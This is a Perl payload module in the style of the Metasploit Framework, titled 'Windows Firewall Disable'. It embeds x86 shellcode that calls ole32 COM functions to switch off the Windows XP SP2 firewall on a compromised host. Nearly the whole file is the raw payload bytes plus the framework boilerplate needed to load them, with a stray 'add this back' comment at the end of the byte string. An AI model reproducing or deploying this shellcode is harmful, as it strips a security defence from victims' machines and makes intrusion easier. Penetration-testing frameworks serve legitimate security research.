
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_fwexit;

use strict;
use base 'Msf::PayloadComponent::Windows::Payload';

my $info =
{
	'Name'         => 'Windows Firewall Disable',
	'Version'      => '$Revision: 1.00 $',
	'Description'  => 'Disables the firewall for Service Pack 2',
	'Authors'      => [ 'lin0xx - lin0xx@NoxisoSec.com' ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'win32' ],
	'Size'         => '',

	'Payload'      =>
		{
			Offsets =>
				{

				},
			Payload  =>
				"\xEB\x02\xEB\x4F\xE8\xF9\xFF\xFF\xFF\x6F\x6C\x65\x33\x32\x2E".
				"\x64\x6C\x6C\x46\x43\x6F\x49\x6E\x69\x74\x69\x61\x6C\x69\x7A".
				"\x65\x45\x78\x46\x43\x6F\x43\x72\x65\x61\x74\x65\x49\x6E\x73".
				"\x74\x61\x6E\x63\x65\x46\xF5\x8A\x89\xF7\xC4\xCA\x32\x46\xA2".
				"\xEC\xDA\x06\xE5\x11\x1A\xF2\x42\xE9\x4C\x30\x39\x6E\xD8\x40".
				"\x94\x3A\xB9\x13\xC4\x0C\x9C\xD4\x5E\x33\xC0\x88\x46\x09\x88".
				"\x46\x18\x88\x46\x29\x8D\x1E\x53\xB8\x77\x1D\x80\x7C\xFF\xD0".
				"\x8B\xF8\x8D\x5E\x0A\x53\x50\xB8\x28\xAC\x80\x7C\xFF\xD0\x33".
				"\xDB\x6A\x02\x53\xFF\xD0\x8D\x5E\x19\x53\x57\xB8\x28\xAC\x80".
				"\x7C\xFF\xD0\x8B\xF8\x8D\x45\xEC\x33\xD2\x8D\x5E\x2A\x8D\x4B".
				"\x10\x50\x53\x6A\x01\x52\x51\xFF\xD7\x8D\x4D\xE0\x51\x8B\x55".
				"\xEC\x8B\x02\x8B\x4D\xEC\x51\x8B\x50\x1C\xFF\xD2\x8D\x45\xF8".
				"\x50\x8B\x4D\xE0\x8B\x11\x8B\x45\xE0\x50\x8B\x4A\x1C\xFF\xD1".
				"\x33\xC0\x50\x8B\x55\xF8\x8B\x02\x8B\x4D\xF8\x51\x8B\x50\x24".
				"\xFF\xD2" #, <- add this back
		},
};

sub _Load 
{
	Msf::PayloadComponent::Windows::Payload->_Import('Msf::PayloadComponent::NoConnection');
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

1;
